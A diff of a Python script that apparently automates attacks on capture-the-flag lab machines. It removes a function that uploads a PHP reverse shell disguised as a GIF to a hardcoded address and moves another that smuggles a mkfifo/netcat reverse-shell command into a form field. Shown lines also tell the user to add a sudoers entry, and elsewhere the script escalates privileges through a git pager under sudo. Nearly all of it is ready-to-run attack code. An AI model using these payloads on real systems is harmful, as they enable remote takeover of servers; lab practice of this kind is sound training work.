@@ -8,29 +8,6 @@ import re
 sess = requests.session()
 usage = f"Usage: {sys.argv[0]} <Machine Name> <Machine Ip>"
 
-# -------------------------------------------------- Carnage -------------------------------------------------- #
-def Carnage():
-    global sess, ip
-    payload = f"""GIF89a;
-<?php
-exec("/bin/bash -c 'bash -i > /dev/tcp/10.8.71.139/1234 0>&1'");
-"""
-    with open('payload.gif.php', 'w') as f:
-        f.write(payload)
-    files = {
-        "Content-Disposition": 'form-data; name="file"; filename="payload.gif.php"',
-        "file" : open('payload.gif.php', 'rb')
-    }
-    values = {
-        "Content-Disposition": '"form-data; name="MAX_FILE_SIZE"',
-        "filename" : "payload.gif.php"
-    }
-    send = sess.post(f"http://{ip}:82/upload.php", files=files, data=values, allow_redirects=True)
-    if(send.status_code == 200):
-        print("[*] Payload Sent")
-        check = sess.get(f"http://{ip}:82/images/")
-        print(check.text)
-
 # -------------------------------------------------- Shrek -------------------------------------------------- #
 def Shrek():
     global ip
@@ -41,32 +18,6 @@ def Shrek():
     shell.sendline(b"")
     time.sleep(1)
     shell.interactive()
-
-# -------------------------------------------------- Tyler -------------------------------------------------- #
-def Tyler():
-    global sess, ip
-    ip = input("Enter Machine Ip: ")
-    LHOST = input("[*] Enter LHOST: ")
-    LPORT = input("[*] Enter Listening Port: ")
-    payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
-
-    postData = {
-        "user" : f'1;{payload}',
-        "submit" : 'Submit+Query'
-    }
-    print("[*] Sending Payload")
-    try:
-        shell = sess.post(f"http://{ip}/betatest/checkuser.php", data=postData)
-        if(shell.status_code == 200):
-            print("[*] Payload Sent")
-            print("[*] vim /etc/sudoers and add 'tdurden ALL=(ALL)	ALL'")
-            print("[*] Then do whatever you want")
-        else:
-            print("[!] Payload Failed")
-            exit()
-    except:
-        print("[!] Connection Failed")
-        exit()
 
 # -------------------------------------------------- Production -------------------------------------------------- #
 def Production():
@@ -95,6 +46,32 @@ def Production():
     shell.sendline(b"""sudo PAGER='sh -c "exec sh 0<&1"' git -p help""")
     time.sleep(1)
     shell.interactive()
+
+# -------------------------------------------------- Tyler -------------------------------------------------- #
+def Tyler():
+    global sess, ip
+    ip = input("Enter Machine Ip: ")
+    LHOST = input("[*] Enter LHOST: ")
+    LPORT = input("[*] Enter Listening Port: ")
+    payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
+
+    postData = {
+        "user" : f'1;{payload}',
+        "submit" : 'Submit+Query'
+    }
+    print("[*] Sending Payload")
+    try:
+        shell = sess.post(f"http://{ip}/betatest/checkuser.php", data=postData)
+        if(shell.status_code == 200):
+            print("[*] Payload Sent")
+            print("[*] vim /etc/sudoers and add 'tdurden ALL=(ALL)	ALL'")
+            print("[*] Then do whatever you want")
+        else:
+            print("[!] Payload Failed")
+            exit()
+    except:
+        print("[!] Connection Failed")
+        exit()
     
 # -------------------------------------------------- H1 - Easy -------------------------------------------------- #
 
